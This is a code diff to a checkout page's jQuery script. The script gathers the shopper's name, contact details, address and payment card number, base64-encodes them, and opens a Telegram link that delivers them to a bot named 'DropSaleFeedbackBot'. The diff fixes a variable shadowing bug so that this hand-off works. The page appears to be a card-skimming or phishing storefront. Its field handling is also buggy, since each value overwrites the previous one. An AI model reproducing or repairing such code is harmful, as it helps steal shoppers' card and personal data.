@@ -159,20 +159,20 @@ $('#shippingFirstName, #shippingLastName, #shippingMiddleName, #shippingEmail, #
         $('#cardMiddleName').val().length  >   0) {
         $('.btn-primary').css({"background-color":"#037BFF"});
         $('.btn-primary').on('click', function(e) { 
-        var JSON = new Object();
-        JSON.name = $('#shippingFirstName').val();
-        JSON.name = $('#shippingLastName').val();
-        JSON.name = $('#shippingMiddleName').val();
-        JSON.name = $('#shippingEmail').val();
-        JSON.name = $('#shippingPhoneNumber').val();
-        JSON.name = $('#shippingStreetAddress1').val();
-        JSON.name = $('#shippingStreetAddress2').val();
-        JSON.name = $('#shippingCity').val();
-        JSON.name = $('#cardNumber').val();
-        JSON.name = $('#cardFirstName').val();
-        JSON.name = $('#cardLastName').val();
-        JSON.name = $('#cardMiddleName').val();
-            var JSONstring = JSON.stringify(JSON);
+        var JSONobject = new Object();
+        JSONobject.name = $('#shippingFirstName').val();
+        JSONobject.name = $('#shippingLastName').val();
+        JSONobject.name = $('#shippingMiddleName').val();
+        JSONobject.name = $('#shippingEmail').val();
+        JSONobject.name = $('#shippingPhoneNumber').val();
+        JSONobject.name = $('#shippingStreetAddress1').val();
+        JSONobject.name = $('#shippingStreetAddress2').val();
+        JSONobject.name = $('#shippingCity').val();
+        JSONobject.name = $('#cardNumber').val();
+        JSONobject.name = $('#cardFirstName').val();
+        JSONobject.name = $('#cardLastName').val();
+        JSONobject.name = $('#cardMiddleName').val();
+            var JSONstring = JSON.stringify(JSONobject);
             var JSONbase64 = window.btoa(JSONstring);
       window.open("tg://resolve?domain=DropSaleFeedbackBot&start="+JSONbase64,"_parent")});
         $('.btn-primary').on('touchstart', function(e) {  
